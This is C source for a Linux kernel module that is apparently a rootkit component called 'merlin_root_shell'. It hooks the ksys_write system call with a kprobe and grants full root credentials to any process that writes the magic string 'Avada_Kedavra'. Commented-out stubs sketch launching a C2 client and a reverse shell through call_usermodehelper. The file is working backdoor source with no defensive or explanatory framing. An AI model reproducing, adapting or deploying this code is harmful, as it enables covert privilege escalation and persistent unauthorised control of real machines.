#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/cred.h>
#include <linux/kmod.h>
#include <linux/unistd.h>
#include <linux/sched.h>


#ifndef pr_fmt
#define pr_fmt(fmt) "%s: " fmt, __func__
#endif

#ifdef DEBUG
#define dbg_print(fmt, ...) pr_info(fmt, ##__VA_ARGS__)
#else
#define dbg_print(fmt, ...) /* No-op */
#endif

int root_shell_init(void);
void root_shell_exit(void);
int shell_handler_pre(struct kprobe *p, struct pt_regs *regs);

struct kprobe kp2 = {
	.symbol_name = "ksys_write",
};

inline void get_root(void) {
    struct cred *cred;
	cred = NULL;
	cred = prepare_creds();
    if (cred != NULL) {
        cred->uid.val = 0;
        cred->gid.val = 0;
        cred->euid.val = 0;
        cred->egid.val = 0;
        commit_creds(cred);
    }
}

// inline int ls_run(void) {
  
//     char path[] = "/bin/ls";
//     char *argv[] = {path, NULL};
//     char *envp[] = {"HOME=/", 
//                 "SHELL=/bin/sh",
//                 "TERM=linux", 
//                 "PATH=/sbin:/bin:/usr/bin", 
//                 NULL};
//     dbg_print("call_usermodehelper module is starting..!\n");
//     call_usermodehelper(path, argv, envp, UMH_NO_WAIT);
    
//     return 0;
// }

// inline int c2_run(void) {

//     // MKDIR fonctionne 

//     // int ret = -1;   
//     // char path[] = "/bin/mkdir";
//     // char *argv[] = {path, "-p", "/tmp/new_dir", NULL};

//     // char *envp[] = {"HOME=/", 
//     //             "SHELL=/bin/sh",
//     //             "TERM=linux", 
//     //             "PATH=/sbin:/bin:/usr/bin", 
//     //             NULL};
//     // printk("call_usermodehelper module is starting..!\n");
//     // ret = call_usermodehelper(path, argv, envp, UMH_NO_WAIT);
//     // printk("ret=%d\n", ret);
//     // return 0;

//     // MAIS PAS Python
//     // int ret = -1;    
//     // char *argv[] = {"/usr/bin/python3", "/root/merlin_client.py", ">", "/dev/null", "&", NULL};  // Arguments
//     // char *envp[] = {"HOME=/",
//     //     "SHELL=/bin/sh",
//     //     "TERM=linux",
//     //     "PATH=/sbin:/bin:/usr/bin",
//     //     NULL};  // Pas d'environnement supplémentaire

//     // printk("call_usermodehelper module is starting..!\n");

//     // ret = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
//     // printk("ret=%d\n", ret);
  
//     return 0;
// }

// inline int nc_run(void) {
    // int ret = -1;   
    // char path[] = "/bin/mkdir";
    // char *argv[] = {path, "-p", "/tmp/new_dir", NULL};

    // char *envp[] = {"HOME=/", 
    //             "SHELL=/bin/sh",
    //             "TERM=linux", 
    //             "PATH=/sbin:/bin:/usr/bin", 
    //             NULL};
    // printk("call_usermodehelper module is starting..!\n");
    // ret = call_usermodehelper(path, argv, envp, UMH_NO_WAIT);
    // printk("ret=%d\n", ret);
    // return 0;


// }



int __kprobes shell_handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    char *buf = (char *) regs->si;
    if (strstr(buf, "Avada_Kedavra") != NULL) {
        get_root();
        dbg_print("Merlin : root privileges granted !  Weldone !\n");
    }
	// if (strstr(buf, "run_c2") != NULL) {
    //     c2_run();
    //     pr_info("Merlin : c2 started !\n");
    // }
    // if (strstr(buf, "run_nc") != NULL) {
    //     nc_run();
    //     pr_info("Merlin : revershell started !\n");
    // }
    // if (strstr(buf, "run_ls") != NULL) {
    //     ls_run();
    //     pr_info("Merlin : ls started !\n");
    // }
    return 0;	
}


int __init root_shell_init(void)
{
	int ret;
	kp2.pre_handler = shell_handler_pre;

	ret = register_kprobe(&kp2);
	if (ret < 0) {
		dbg_print("register_kprobe failed, returned %d\n", ret);
		return ret;
	}
	dbg_print("sys_write hook loaded : %px\n", kp2.addr);
	return 0;
}

void __exit root_shell_exit(void)
{
	unregister_kprobe(&kp2);
	dbg_print("file_hide exit successfully\n");
}

// Uncomment if you want to use this module as a standalone module
// module_init(root_shell_init)
// module_exit(root_shell_exit)

MODULE_AUTHOR("Phoenix2006");
MODULE_DESCRIPTION("merlin_root_shell");
MODULE_LICENSE("GPL");
